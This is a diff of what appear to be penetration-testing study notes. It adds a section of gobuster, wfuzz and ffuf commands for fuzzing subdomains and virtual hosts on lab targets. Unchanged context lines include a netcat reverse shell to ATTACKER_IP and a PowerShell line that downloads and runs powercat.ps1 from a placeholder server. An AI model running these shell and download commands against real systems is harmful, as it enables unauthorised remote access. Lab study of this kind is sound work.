@@ -109,6 +109,26 @@ IEX(New-Object System.Net.WebClient).DownloadString("SERVER_ADDRESS/powercat.ps1
 # URL encode as needed
 nc -e /bin/bash ATTACKER_IP ATTACKER_PORT
 ```
-## Exercises To-Do
+## Subdomain and vhost 
 
-- [ ] 2.1.1 (page 20)
+```
+gobuster vhost --useragent "PENTEST" --wordlist "/path/to/wordlist.txt" --url $URL
+```
+```
+wfuzz -H "Host: FUZZ.something.com" --hc 404,403 -H "User-Agent: PENTEST" -c -z file,"/path/to/wordlist.txt" $URL
+```
+```
+ffuf -H "Host: FUZZ.$DOMAIN" -H "User-Agent: PENTEST" -c -w "/path/to/wordlist.txt" -u $URL
+```
+```
+ffuf -c -r -w "/path/to/wordlist.txt" -u "http://FUZZ.$TARGET/"
+```
+```
+ffuf -w ./vhost -H "Host: FUZZ.inlanefreight.htb" -u http://10.129.136.58 -fs 10918
+```
+```
+ffuf -u http://94.237.59.63:40817 -H "Host: FUZZ.inlanefreight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 10198 -mc 200
+```
+```
+ffuf -u http://94.237.59.63:40817 -H "Host: FUZZ.inlanefreight.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -fs 116 -mc 200
+```
